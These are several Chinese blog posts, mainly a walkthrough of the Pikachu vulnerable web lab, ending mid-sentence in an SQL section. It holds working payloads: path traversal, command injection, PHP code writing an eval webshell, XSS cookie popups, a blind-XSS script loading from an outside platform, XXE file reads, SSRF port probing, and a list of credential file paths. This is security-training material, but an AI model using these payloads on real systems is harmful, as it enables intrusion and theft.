前言\n不积跬步，无以至千里;不积小流，无以成江海。–荀子声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io\n\n0x01 Xshell连接后，命令行安装宝塔wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh\n\n0x02 服务器防火墙开放8888端口\n0x03 外网访问宝塔面板\n0x04 修改默认端口保证服务器安全#Ubuntu首次使用root用户，设定密码。sudo passwd#从ubuntu用户切换到root让用户，以拥有足够权限修改配置文件。su root#修改sshd_config配置文件，设SSH连接端口为54682vim /etc/ssh/sshd_config#建议留存22端口，举个例子：#Port 54682#Port 22#重启ssh服务service sshd restart#注：修改系统防火墙规则，允许外部访问54682端口iptables -A INPUT -p tcp --dport 54682 -j ACCEPT#安装iptables-persistent工具，用以写入持久化规则sudo apt-get install iptables-persistent#持久化规则，以保证规则在重启系统时不会被删除sudo netfilter-persistent savesudo netfilter-persistent reload#修改服务器防火墙的ssh连接端口与sshd_config文件中的一致。#连接新端口能够成功，则可在服务器控制台中禁用默认22端口\n\n\n\n\n0x05 后记\n一口气吃不成胖子，最需要的还是自己的日积月累。–涂寐\n\n","categories":["工具集"],"tags":["随笔","环境"]},{"title":"VMware磁盘扩容","url":"/article/bf618eac.html","content":"0x00 前言\n现如今，虚拟机使用越来越常见，但使用到最后都发现一个问题：随着虚拟机中软件安装、文件拷贝、资料下载等因素导致的磁盘占用空间的增多，创建虚拟机时开辟的那点磁盘空间已难以满足我们的使用，因此我们必须要对虚拟机中磁盘进行扩容。\n虚拟机扩容，按我的理解有两种方式，一种是增加一个新磁盘，另一种是在增大当前磁盘容量。笔者为了提高磁盘利用率，选择的是第二种，能够更加有效的利用磁盘的每一比特空间。\n\n0x01 猜想\n当感觉磁盘空间不足时，笔者直接在编辑虚拟机设置中针对硬盘进行了扩展，然后直接报错：当给虚拟机虚拟磁盘扩容时，显示文件系统的空间不足，无法执行选定的操作。\n通过一番百度总结，VMware的扩展原理大致为：新建一个更大的磁盘文件，再把原磁盘文件拷贝到新磁盘文件中，最后删除原磁盘文件。\n因此，扩展的必要条件为：物理机系统可用空间必须不小于虚拟机新磁盘容量大小。\n\n0x02 扩展\nVMware中打开编辑虚拟机设置–&gt;选定硬盘–&gt;看到磁盘实用工具，点击扩展–&gt;输入扩展磁盘容量–&gt;等待扩展完整，建议先打一盘王者。\n\n\n0x03 Windows分区\n右键微软的图标–&gt;磁盘管理–&gt;可以见到未分配的空间–&gt;右键C盘，发现扩展卷不可选（在要延伸的分区后面没有相邻的未分配空间或空闲空间）–&gt;利用DiskGenius工具（文末有连接）扩展分区–&gt;在工具内右键C盘，选择扩容分区–&gt;选定未分配空间，开始合并–&gt;等待重启，磁盘不再标红。\n\n\n\n\n0x04 kali分区\n在VMware中进行容量扩展和0x02一直，仅是分区有些差别，是使用终端操作，比较麻烦。\n\n1、查看磁盘空间，fdisk -l\nfdisk -l：可以想象为Windows的磁盘管理。操作后发现扩展的磁盘空间已经加载。\n\n2、查看系统磁盘使用情况：df -h\n操作后发现原磁盘空间未改变，即新容量没有添加到到原磁盘中。\n\n3、查看系统根目录下磁盘，找到根目录分区：lsblk\n4、卸载根目录分区并重建\n进入硬盘sda的管理界面：fdisk &#x2F;dev&#x2F;sda –&gt;选择删除操作：d –&gt;删除sda1分区：1 –&gt; 选择新建操作：n –&gt;4次回车–&gt;是否删除磁盘签名（图中有误）：y –&gt;保存：w –&gt;查看sda1的系统文件格式：df -T &#x2F;dev&#x2F;sda1 –&gt;同步文件系统中容量：resize2fs &#x2F;dev&#x2F;sda1（xfs文件系统 ，使用 xfs_growfs 命令； Ext4&#x2F;2&#x2F;3，使用 resize2fs 命令）–&gt;手动重新系统，重启过程可能发现像系统崩了（可能是真的崩了），先打局王者就好了。–&gt;有时，容量是修改不成功的，但笔者不服气呀，多同步文件系统几次后，莫名就得了。\n\n\n0x04 工具链接\nVMware：https://www.vmware.com/\nDiskGenius：https://www.diskgenius.cn/\n\n0x05 后记\n过程很简单，理解有曲折，贵在有求索。–涂寐\n\n","categories":["随笔"],"tags":["随笔","VMware"]},{"title":"各种测试","url":"/article/a66d6b09.html","content":"代码高亮\n#include&lt;stdio.h&gt;int main()&#123;\tint a,i,b,n;\tprintf(&quot;3000以内的亲密数：\\n&quot;);\tfor(a=1;a&lt;3000;a++) /*穷举3000以内的全部整数*/\t&#123;\t\tfor(b=0,i=1;i&lt;=a/2;i++) //求出a的各因子，各因子之和存放于b\t\t\tif(!(a%i))\t\t\t\tb+=i; \t\tfor(n=0,i=1;i&lt;=b/2;i++) //直接利用b，将b的各因子之和存于n\t\t\tif(!(b%i))\t\t\t\tn+=i;\t\tif(n==a&amp;&amp;a&lt;b) //若b的因子之和n=a，且a&lt;b（防止重复，a和b的位置交换），则a和b是一对亲密数\t\t\tprintf(&quot;%d和%d是一对亲密数！\\n&quot;,a,b);\t&#125;&#125;","tags":["Test"]},{"title":"keep主题之修改字体与背景色","url":"/article/d9ba2a9a.html","content":"全局字体修改全局字体，此处为隶书\n\\themes\\keep\\source\\css\\common\\variables.styl\n\n局部字体座右铭\\themes\\keep\\source\\css\\layout\\_partial\\first-screen.styl\n\n博客名\\themes\\keep\\source\\css\\layout\\_partial\\header.styl\n\n字体中英文对应隶书：LiSu 幼圆：YouYuan 华文细黑：STXihei 华文楷体：STKaiti 华文宋体：STSong 华文中宋：STZhongsong 华文仿宋：STFangsong 方正舒体：FZShuTi 方正姚体：FZYaoti 华文彩云：STCaiyun 华文琥珀：STHupo 华文隶书：STLiti 华文行楷：STXingkai 华文新魏：STXinwei \n背景色此处仅修改白天背景色\n\\themes\\keep\\source\\css\\common\\variables.styl\n\n","categories":["Hexo"],"tags":["Hexo","keep"]},{"title":"keep主题之图床_评论_压缩","url":"/article/447dc4ce.html","content":"前言本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。 –涂寐\n正文图床GitHub给他一个专门的公开仓库存储。token所在url：https://github.com/settings/tokens选 Personal access tokens –&gt; Generate new token创repo 权限（勾选3、5就好）的 GitHub Token，注意当场背下^_^自动目录，好分辨点，更好的就新建目录，每次都新建又太麻烦。不用试了，这个token早已失效~上传注意个性化设置，避免同名上传失败。去写文章吧，上传你美美的图片~\n评论系统Gitalk因为懒，第一时间想的是用Gitalk。创个 GitHub OAuth App请当场背下密钥~存评论的GitHub仓库就不写了，前面有~配置keep主题下的_config.yml之后，若提示未初始化，hexo d后，点击使用GitHub登录进行认证即可\nValine突然发现，Gitalk需要登录才能评论，果断换了Valine整个号，需要实名认证~创应用，获取凭证，请将其当场背下~又是_config.yml，还是keep主题下的~效果还是很不错滴~\n资源压缩hexo-all-minifier插件，集成html-minifier、clean-css、uglify和imagemin，简单安装与配置即可打包压缩HTML、CSS、JavaScript、图片等资源文件\n\n使用npm下载一直报错，直接改用cnpm即可\nnpm install hexo-all-minifier\nnpm install -g cnpm –registry&#x3D;https://registry.npm.taobao.org\ncnpm install hexo-all-minifier# 资源压缩--&gt;下载失败#使用cnpm install hexo-all-minifier下载#简单配置all_minifier: true#详细设置# html压缩html_minifier:  enable: true  ignore_error: false  exclude:# css压缩css_minifier:  enable: true  exclude:    - &#x27;*.min.css&#x27;# js压缩js_minifier:  enable: true  mangle: true  compress:  exclude:    - &#x27;*.min.js&#x27;js_concator:  enable: false  bundle_path: &#x27;/js/bundle.js&#x27;  front: false  silent: false# 图片优化image_minifier:  enable: true  interlaced: false  multipass: false  optimizationLevel: 2  pngquant: false  progressive: false\n\n","categories":["Hexo"],"tags":["Hexo","keep"]},{"title":"pikachu_全通关笔记_含源码解析","url":"/article/39c9e418.html","content":"前言\n\n打 pikachu 靶场断断续续的，直到现在才通关和理解完毕。\n为什么我要拿 pikachu 来练基础呢？第一，开篇有漏洞概念和简要使用叙述；第二，够基础，wp较多\n最满意的，还是对 sql 模块的代码解析，很详很乱（解题时的笔记吗，总有些莫名的思路），但我理解\n\n\n系统敏感文件路径// Windowsadminc:\\boot.ini \t\t\t\t\t// 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml\t// IIS配置文件c:\\windows\\repair\\sam\t\t\t\t// 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini\t                // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD       // MySQL root密码c:\\windows\\php.ini \t                \t// php 配置信息c:\\Windows\\win.ini \t                \t// Windows系统的一个基本系统配置文件// Linux/etc/passwd \t\t\t     \t                // 账户信息/etc/shadow \t\t\t\t                // 账户密码文件/usr/local/app/apache2/conf/httpd.conf \t                // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf\t// 虚拟网站配置/usr/local/app/php5/lib/php.ini \t     \t        // PHP相关配置/etc/httpd/conf/httpd.conf \t\t\t\t// Apache配置文件/etc/my.conf \t\t\t\t\t\t// mysql 配置文件/proc/mounts\t\t\t\t\t\t// 记录系统挂载设备/porc/config.gz\t\t\t\t\t        // 内核配置文件/var/lib/mlocate/mlocate.db\t\t\t        // 全文件路径/porc/self/cmdline\t\t\t\t\t// 当前进程的cmdline参数/root/.ssh/known_hosts\t\t\t\t\t// 记录每个访问计算机用户的公钥/root/.bash_history\t\t\t\t\t// 用户历史命令记录文件/root/.mysql_history\t\t\t\t        // mysql历史命令记录文件/root/.ssh/authorized_keys\t\t\t        // 公钥相关/root/.ssh/id_rsa/root/.ssh/id_ras.keystore\n..&#x2F;..&#x2F;目录遍历对比url，发现是通过参数title来改变调用的文件，假设使用多个..&#x2F;使之达到顶级目录，再向下猜想路径。\n# 靶场用kali搭的，就访问这 /etc/passwd# Windows：Windows/win.inihttp://192.168.135.132:4512/vul/dir/dir_list.php?title=../../../../../etc/passwd\n\n敏感信息泄露IcanseeyourABC审计网页源代码，总有些意外之喜\n暴力破解基于表单的暴力破解无验证码直接爆破。\n验证码绕过(on server)网页源码审计，自身验证码库。丢重放里试，只要不放包，验证码不刷新。\n验证码绕过(on client) 与token防爆破?网页源码审计，前端JS验证。丢重放里试，只要不放包，验证码不刷新；其他，禁用JS。\n\nCSRF Token Tracker插件，填入host和token，爆破时自动识别token更新，线程调为1，插件识别较慢。\nIntruder模块自带功能Grep-Extract，Refetch response识别网页，网页中选中token值插件自动取值；交叉爆破，密码为参数1，token为参数2，token使用Recursive grep类型字典（递归）。\n\n\nRCE全称：remote command&#x2F;code execute\nexec “ping”远程命令执行可以想到，在多个指令结合使用时常用管道连接符 | 进行连接，抑或其他命令连接符 &amp;、&amp;&amp;、|| 等。docker搭建的靶场，无法ping出结果，测试其他命令类似\n# 正常命令结构\tping 127.0.0.1# 命令拼接后\t127.0.0.1|ls ../        127.0.0.1|pwd\tad||ls\n\nexec “evel”远程代码执行\n# 直接写入命令查看php信息    phpinfo();# 可以使用的系统命令函数/程序执行函数    system()    passthru()    exec()    shell_exec()    popen()    proc_open()    pcntl_exec()    ……# 使用exec函数族# 调用进程内部执行一个可执行文件# shell_exec将所有输出流作为字符串返回# exec默认情况下返回输出的最后一行，但可以将所有输出提供为指定为第二个参数的数组\techo shell_exec(&#x27;pwd&#x27;);\techo shell_exec(&#x27;ls ../../&#x27;);\techo exec(&#x27;whoami&#x27;);\techo exec(&#x27;ls ../&#x27;);\texec(&#x27;ls ../&#x27;, $out);var_dump($out);# 使用命令执行函数system()\techo system(&#x27;ls&#x27;);\n\nFile Inclusion文件包含漏洞\nFile Inclusion(local)本地文件包含漏洞分析URL可见，filename可控；分析源码，后端直接拼接前端 filename 传入的参数值后交由include()调用。\nhttp://192.168.135.132/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\n\nFile Inclusion(remote)远程文件包含漏洞\n# 你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!# 路径，重启\t/etc/php/8.0/apache2/php.ini# 自己看程序执行函数，进行理解，这里推荐两篇文章\thttps://www.cnblogs.com/0daybug/p/12610834.html        https://www.cnblogs.com/Rain99-/p/13720299.html\n# tumei.txt# http://192.168.135.132:49154/vul/fileinclude/fi_remote.php?filename=http://192.168.135.131/pikachu/tumei.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2# 举例：http://192.168.135.132/vul/fileinclude/tumei.php?tumei=ls&lt;?php    $myfile = fopen(&quot;tumei.php&quot;, &quot;w&quot;);    $txt = &#x27;&lt;?php system($_GET[&quot;tumei&quot;]);?&gt;&#x27;;    fwrite($myfile, $txt);    fclose($myfile);?&gt;\n# tumei.txt# 蚁剑连接：http://192.168.135.132/vul/fileinclude/tumei.php&lt;?php    $myfile = fopen(&quot;tumei.php&quot;, &quot;w&quot;);    $txt = &#x27;&lt;?php @eval($_POST[&quot;tumei&quot;]);?&gt;&#x27;;    fwrite($myfile, $txt);    fclose($myfile);?&gt;\nUnsafe Filedownload不安全的文件下载简单的点击下载，没发现下载接口；瞅下网页源码，哈~\nhttp://192.168.135.132/vul/unsafedownload/execdownload.php?filename=../../../../../etc/passwd\n\nUnsafe Fileupload不安全的文件上传漏洞\nclient check看下网页源码，前端JS验证白名单，直接禁用JS，KO；麻烦点的，改后缀（非图片马），绕过前端验证。\nMIME type随便张图，还是爆路径；其他格式，限制白名单。验证上传文件格式？如题1，抓包改后缀，KO。\n#　常见的MIME typetext/html\t\t# 超文本标记语言文本.htmltext/xml\t\t# xml文档.xmlapplication/xhtml+xml\t# XHTML文档.xhtmlapplication/pdf\t\t# PDF文档 .pdfapplication/msword\t# Microsoft Word文件 .wordtext/plain\t\t# 普通文本.txtapplication/rtf\t\t# RTF文本.rtfimage/gif\t\t# GIF图形.gifimage/jpeg\t\t# JPEG图形.ipeg,jpg\ngetimagesize看下网页源码，无前端验证上传一句话木马改后缀，假图片警告。随便一个文件，非jpg,jpeg,png后缀则判断无后缀。看下源码，大致为比对白名单，重命名文件后拼接白名单后缀。查下getimagesize()函数，大致为校验文件类型（文件头）和限制文件大小！写个图片马呗注：图片马不建议太大，可能不识别。\n# abc.txt 内容：&lt;?php phpinfo();?&gt;# abc.jpg 为任意图片# tumei.jpg 为图片马copy abc.jpg/b + abc.txt/a tumei.jpg\n# 直接访问上传图片，看到的是以图片形式打开http://192.168.135.132/vul/unsafeupload/uploads/2021/12/03/54399561a9f8908b517819183869.png# 配合文件包含漏洞解析图片，即访问如下链接，以PHP形式打开上传的图片，就可以直接叫蚂蚁扛着剑来# 注：URL勿乱码，中文转URL编码即可，乱码将无法连接一句话木马http://192.168.135.132/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/12/03/54399561a9f8908b517819183869.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\nOver Permission跨站请求伪造\n水平越权URL中最为常见，用某些参数（如?username&#x3D;admin）来管理界面的显示，不防范好直接就是一个水平。\nhttp://192.168.135.132/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF#\n垂直越权知道仅对管理员开放操作的URL，但普通用户知晓后亦可访问且操作，赤果果的拥有管理员权限。\nhttp://192.168.135.132/vul/overpermission/op2/op2_admin_edit.php\nURL重新向不安全的url跳转\n# url参数可控，可跳转至任意站点。如下跳转至笔者博客http://192.168.135.132/vul/urlredirect/urlredirect.php?url=https://0xtlu.me\n\nCSRFCSRF(get)看下tips，拿账号直接登录，登陆后用户有修改用户信息的功能。修改信息界面修改时抓包：方法一、通过BP自带的Generate CSRF Poc功能伪造实现该请求的HTML表单网页，通过远程服务器部署该网页诱导点击；方法二、抓包发现，请求数据附加在URL中且无防护，直接拼接URL再发给其他用户点击。\nhttp://192.168.135.132/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=%E6%9D%8E%E7%99%BD&amp;add=afaf&amp;email=afafwe&amp;submit=submit\n\nCSRF(post)请求数据在请求包的包体中。抓包，无token验证，尝试通过BP的Change request method功能将post请求转成get请求形式来实现漏洞，无果。如题1方法一，发现点击钓鱼网页后直接报错，重启KO。建议，网页伪装进行美化，更具诱导性。\nCSRF Token抓包，get+token，多次抓包，token随机，尝试如题1方法二，无解。\nCross-Site Scripting跨站脚本\n反射型xss(get)检测一波转义和过滤’&lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;“，无过滤转义，写入img标签&lt;img src=1&gt;直接原形式读取，KO；深入利用，前端限制输入长度，方法一：看下URL，在上面直接修改输入；方法二：F12直接更改长度，错误的图片触发cookie弹窗：&lt;img src=1 onerror=&#39;alert(document.cookie)&#39;&gt;\nhttp://192.168.135.132/vul/xss/xss_reflected_get.php?message=&lt;img src=1 onerror=&#x27;alert(document.cookie)&#x27;&gt;&amp;submit=submit\n反射型xss(post)如题1，前端却无法修改输入长度；抓包，修改表单中的输入修改，KO\n存储型xss如题1，KO。留言板内容存储数据库，当他人访问该页面亦会弹出cookie窗口。\nDOM型xss随便输入，有条跳转提示，URL重定向？别逗了，这测XSS。构造标签闭合，点击事件触发弹窗，KO\n# 拼接标签，#为链接到当前页面，输入的单引号&#x27;输出后显示为双引号# # 号可替换为任意可访问的链接# &#x27; onclick=&quot;alert(123)&quot;&gt;\thttps://0xtlu.me&#x27; onclick=&quot;alert(123)&quot;&gt;\t\n\nDOM型xss-x如题4，仅是内嵌两层标签，需要点击新标签方能触发。\nxss盲打随便输入xss语句，没过滤，后台也确实可见，找个盲打平台搞他，直接拿到cookie。\n&lt;/tExtArEa&gt;&#x27;&quot;&gt;&lt;sCRiPt sRC=//xsshs.cn/aPwe&gt;&lt;/sCrIpT&gt;\nxss之过滤直接给他整个img标签，过滤呢？实现script标签，我输入呢？直接被干掉，变下大小写，KO。看下源码，仅过滤script标签。尝试双尖号绕过，KO。\n&lt;img src=1 onerror=alert(123)&gt;&lt;script&gt;alert(369)&lt;/script&gt;&lt;ScRiPT&gt;alert(369)&lt;/ScRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;\nxss之htmlspecialchars没忘这个这个小语句吧^~^， ‘&lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;“ 瞅下网页源码， &lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;&gt;&quot; ，且输入作为a标签的herf内容；先简单了解下htmlspecialchars() 函数，把预定义的字符转换为 HTML 实体，那不要 &lt;&gt; ，直接插入点击事件作为herf的值 ‘onclick&#x3D;’alert(369)’ ，KO。\n// herf= 拼接点击事件&#x27;onclick=&#x27;alert(369)&#x27;// herf= 拼接js语句，即使用js协议执行alert(369)javascript:alert(369)\nxss之href输出直接试题8的payload，第二个KO。\n&lt;a href=&quot;javascript:alert(369)&quot;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;\nxss之href输出随便输入 &#39;&lt;;6(6=6&amp;6)6&gt;6/&quot; ，居然没发现输入的内容，网页源码我来啦。可以看到，是使用js脚本处理输入，通过ms变量存储输入，接着判断ms长度，才进行 if else 判断是否有符合的输入。尝试闭合script标签，明显看到成功触发弹窗，且阻断后续代码执行。\n&#x27;&lt;/script&gt;&lt;img src=1 onerror=&quot;alert(369)&quot;&gt;&quot;&lt;/script&gt;&lt;script&gt;alert(369)&lt;/script&gt;\nXXE&quot;xml external entity injection&quot;，既”xml外部实体注入漏洞”。了解下XML，XML是可扩展的标记语言（eXtensible Markup Language），用来进行数据的传输和存储。\n部分语言外部实体类型\n\n\nlibxml2\nPHP\nJava\n.NET\n\n\n\nfile\nfile\nfile\nfile\n\n\nhttp\nhttp\nhttp\nhttp\n\n\nftp\nftp\nftp\nftp\n\n\n\nphp\nhttps\nhttps\n\n\n\ncompress.zlib\njar\n\n\n\n\ncompress.bzip2\nnetdoc\n\n\n\n\ndata\nmailto\n\n\n\n\nglob\ngopher *\n\n\n\n\nphar\n\n\n\n\nXXE漏洞随便输入，返回 XML声明、DTD文档类型定义、文档元素这些都搞懂了吗? 我不懂，马上找度娘了解一波。懂了，但又没完全懂，之后再遇到在针对性操作或有空再看看类似的靶场。\n\n提交正常数据\n&lt;!-- XML声明部分 --&gt;&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!-- 文档类型定义（DTD） --&gt;&lt;!-- 用来为 XML 文档定义语法约束，可为内部声明，抑或使引用外部DTD和公共DTD --&gt;&lt;!DOCTYPE note [\t&lt;!-- 外部实体引入资源，SYSTEM和PUBLIC 分别表示从本地和网络引入 --&gt;\t&lt;!-- &lt;!ENTITY tumei SYSTEM &quot;file:///etc/passwd&quot;&gt; --&gt;\t&lt;!ENTITY tumei &quot;I am tu Mei, a permeate small white&quot;&gt;]&gt;&lt;!-- 文档元素 --&gt;&lt;!-- 通过 &amp;tumei; 调用实体 tumei ，使存储到其中的内容在前端回显 --&gt;&lt;name&gt;&amp;tumei;&lt;/name&gt;\n\n任意文件读取此处读取&#x2F;etc&#x2F;passwd\n&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [\t&lt;!ENTITY tumei SYSTEM &quot;file:///etc/passwd&quot;&gt;\t&lt;!-- /etc/passwd 为要读取的文件 --&gt;]&gt;&lt;name&gt;&amp;tumei;&lt;/name&gt;\n\n使用php伪协议，将ssrf.php源码进行base64编码后输出前端\n&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [\t&lt;!ENTITY tumei SYSTEM &quot;php://filter/read=convert.base64-encode/resource=../ssrf/ssrf.php&quot;&gt;]&gt;&lt;name&gt;&amp;tumei;&lt;/name&gt;\n\n简述利用\n任意文件读取\n探测内网地址\n通过DTD窃取文件\n远程代码执行\n\nSSRFServer-Side Request Forgery:服务器端请求伪造\nSSRF(curl)\n点击读诗，看了下URL，可控？改下url参数的值，成功通过服务器访问显示百度首页；利用其他协议读取内部文件，KO。\n看下源码，对输入值没过滤就直接作为 curl_exec() 函数的参数，完完。\ncurl_exec() –&gt;执行 cURL 会话，若其参数为URL，则访问该URL。\ncurl_exec() 参数所支持的一些协议：FTP、FTPS、HTTP、HTTPS、GOPHER,、TELNET、DICT、FILE、LDAP等# 显示百度首页和任意文件读取http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com/http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd# 端口探测，此处pikachu容器的3306端口映射到49153端口；端口未开启仍显示没啥变化的读诗界面http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=192.168.135.132:3306http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=192.168.135.132:49153http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=127.0.0.1:80\n\n\n\nSSRF(file_get_content)一瞅，file参数可控，还是先了解下 file_get_contents() 函数：file_get_contents() –&gt; 将文件的内容读入到一个字符串中看下源码，一样直接把输入作为 file_get_contents() 参数值，转成字符串后再 echo 输出\n# 使用PHP伪协议爆敏感文件，base64解码查看内容哈http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php# 使用file协议，想看下其他敏感文件，奈何权限不够呀~http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd# 作为中间人远程访问其他网站或内网探测http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=https://0xtlu.mehttp://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1:3306\nPHP反序列化序列化 serialize() ：将变量转换为可保存或传输的字符串的过程。反序列化 unserialize() ：将字符串转化为原来的变量使用，且只能将已经定义过的对象反序列化。\n与PHP（反）序列化有关的魔法函数php类中包含一些魔法函数，可在代码中任何地方不用声明即可使用\n__construct()\t\t\t//当一个对象创建时被调用__destruct()\t\t\t//对象被销毁时触发__wakeup()\t\t        //使用unserialize时触发__sleep()\t\t        //使用serialize时触发__toString()\t\t\t//把类当作字符串使用时触发__get()\t\t\t\t//用于从不可访问的属性读取数据__set()\t\t\t\t//用于将数据写入不可访问的属性__isset()\t\t\t//在不可访问的属性上调用isset()或empty()触发__unset()\t\t\t//在不可访问的属性上使用unset()时触发__invoke()\t\t\t//当脚本尝试将对象调用为函数时触发\n反序列化学习与测试# 漏洞银行丨PHP反序列化getshell丨咖面56期https://www.bilibili.com/video/BV1Ft41187ZX?from=search&amp;seid=11578774070645570762# luckySec大佬博客http://luckyzmj.cn/posts/92124f05.html\n试下 pikachu 提供例子\n&lt;?php\tclass S&#123;        public $test=&quot;pikachu&quot;;    &#125;    $s=new S();    echo serialize($s);?&gt;\n序列化后结果写入题目输入框，打印出 pikachu 字样，看下网页源码，看到了p标签里的皮卡丘\nO:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;# O：object# 1：对象名称（S）长度# S：对象名称# 1：对象中变量个数# s：数据类型# 4：变量名长度# test：变量名# s：数据类型# 7：变量值长度# pikachu：变量值# 其他数据类型说明a - array  b - boolean  d - double  i - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string\n瞅下源码，尝试分析一波\nclass S&#123;    var $test = &quot;pikachu&quot;;    function __construct()&#123;        echo $this-&gt;test;    &#125;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;o&#x27;]))&#123;    $s = $_POST[&#x27;o&#x27;];    if(!@$unser = unserialize($s))&#123;        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;    &#125;&#125;# 实例化对象，S对象的test属性最终会拼接在p标签中# 当我们输入序列化字符串时，将变量test的值篡改为恶意代码，将造成攻击# if(isset($_POST[&#x27;o&#x27;]))：判断是否存在通过POST请求提交的变量o# if(!@$unser = unserialize($s))：判断 $s 是否为序列化字符，不明白的看开头# 构成完整的p标签后，使用 $html 存储，通过 &lt;?php echo $html;?&gt; 把结果输出网页\nXSS弹窗：在反序列化数据后，立即自动调用了 __construct() 函数，执行 &lt;img src&#x3D;1 onerror&#x3D;alert(‘IamTuMei’)&gt;反序列化先简单了解到这吧，之后再找专门靶场\n&lt;?php    class S&#123;        var $test = &quot;&lt;img src=1 onerror=alert(&#x27;IamTuMei&#x27;)&gt;&quot;;    &#125;    $a = new S();    echo serialize($a);?&gt;\nO:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:37:&quot;&lt;img src=1 onerror=alert(&#x27;IamTuMei&#x27;)&gt;&quot;;&#125;\nphp在线运行平台# php在线运行平台http://www.dooccn.com/php/https://c.runoob.com/compile/1/https://www.toolnb.com/dev/runCode/243e11a40a13ca67d0f13d10dadfdd48.html\nSql InjectSql语法学习# 菜鸟教程——SQL语法手册# https://www.runoob.com/w3cnote/sql-syntax-manual.html# SELECT相关SELECT * FROM member\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-- 查找表 member 的所有记录SELECT * FROM member WHERE id=&#x27;1&#x27;\t\t\t\t\t\t\t\t\t\t-- 从 member 中查找字段 id 为 1 的记录SELECT * FROM member WHERE id=&#x27;1&#x27; OR id=&#x27;3&#x27;\t\t\t\t\t-- OR，有 TRUE 为 TRUE ；AND，有 FALSE 为 FALSESELECT * FROM member WHERE id BETWEEN &#x27;2&#x27; AND &#x27;5&#x27;\t\t-- 指定查找字段 id 从 2 到5 的记录SELECT DISTINCT pw FROM member\t\t\t\t\t\t\t\t\t\t\t-- 不重复查找表 member 中字段 pw 的所有记录SELECT * FROM member ORDER BY `username`\t\t\t\t\t\t--按 username 字段排序所有记录# 全字段插入新行InSERT INTO member VALUES (45,&#x27;admin&#x27;,&#x27;admin&#x27;,&#x27;gril&#x27;,&#x27;13888888888&#x27;,&#x27;admin&#x27;,&#x27;admin@qq.com&#x27;)# 对应字段写入INSERT INTO `pikachu`.`member` (`username`, `pw`, `sex`, `phonenum`, `address`, `email`) VALUES (&#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;girl&#x27;, &#x27;4466&#x27;, &#x27;fafa&#x27;, &#x27;daff@163.com&#x27;)# 更新 sex = &#x27;da&#x27;所在记录的 usernmae 为 rootUPDATE member SET username = &#x27;root&#x27;WHERE sex\t= &#x27;da&#x27;# 删除 username = &#x27;admin&#x27; 的所有记录DELETE FROM member WHERE username = &#x27;admin&#x27;# 获取 member 表中所有 email 记录，并使用组内拼接函数 group_concat() 拼接所有 email 记录SELECT group_concat(email) FROM member# UNION 操作符# 作用：合并多个 SELECT 语句的结果集，不允许重复值# 注：每个 SELECT 语句需要拥有相同数量的列，且列数据类型和列顺序需相同(似乎不是，强转？暂时不明白！突然想到，这是用来合并结果集的，那数据类型和顺序相同都是为了方便比较去掉重复值)SELECT username,email FROM member WHERE id=2 UNION SELECT username,email FROM member;SELECT &#x27;a&#x27;,5 UNION SELECT 4,&#x27;af&#x27;;# 其他# mysql注释符 &#x27;#&#x27; 和 &#x27;--&#x27;# url中#号用来指导浏览器动作（如锚点），对服务器端完全无用。故，HTTP请求中需要将#号改成%23# --与代码中的单引号连接时，将无法形成有效的mysql语句。# --+ +号在写入url时将变成空格（%20），进而与后面的单引号分隔开，成功注释后面语句。url中+号有时变成%2b造成报错，直接手动给他改成+# --%20 +号变成空格？直接手动加空格（%20）# --&#x27; 直接添加一个 &#x27; 构造闭合# DATABASE(); 当前数据库# ORDER BY; 根据某字段对结果集排序# GROUP BY; 根据某字段对结果集分组# group_concat(); 将 